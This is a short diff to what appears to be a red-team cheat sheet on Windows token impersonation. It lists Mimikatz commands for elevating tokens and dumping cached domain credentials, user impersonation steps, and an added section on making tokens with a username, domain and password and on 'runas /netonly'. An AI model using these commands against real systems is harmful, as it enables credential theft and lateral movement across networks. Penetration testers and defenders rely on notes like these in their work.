@@ -15,8 +15,15 @@ Mimikatz token::elevate lsadump::cache
 Local Admin Required
 
 ImpersonateProcess
-ImpersonateUser
+ImpersonateUser DOMAIN\user
 Impersonated token RevToSelf
+
+#MakeToken
+Local Admin not Required
+MakeToken user domain pass
+runas.exe /netonly
+
+
 
 
  
